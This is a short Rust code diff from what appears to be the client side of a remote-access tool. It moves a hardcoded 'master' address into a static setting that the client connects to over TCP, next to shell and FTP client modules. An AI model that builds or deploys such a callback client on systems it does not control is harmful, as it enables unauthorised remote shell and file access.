@@ -14,6 +14,8 @@ use module::Shell::ShellClient;
 use crate::module::ftp::FtpClient;
 
 lazy_static!{
+    static ref G_MASTER_ADDR : &'static str = "192.168.199.127:8000";
+    static ref G_MASTER_PROTOCOL : HeroinnProtocol = HeroinnProtocol::TCP;
     static ref G_OUT_BYTES : Arc<AtomicU64> = Arc::new(AtomicU64::new(0));
     static ref G_IN_BYTES : Arc<AtomicU64> = Arc::new(AtomicU64::new(0));
 }
@@ -52,7 +54,7 @@ fn main() {
 
         let (session_sender , session_receiver) = channel::<SessionBase>();
 
-        let mut client = match TcpConnection::connect("192.168.199.127:8000"){
+        let mut client = match TcpConnection::connect(&G_MASTER_ADDR){
             Ok(p) => p,
             Err(e) => {
                 log::info!("connect faild : {}" , e);
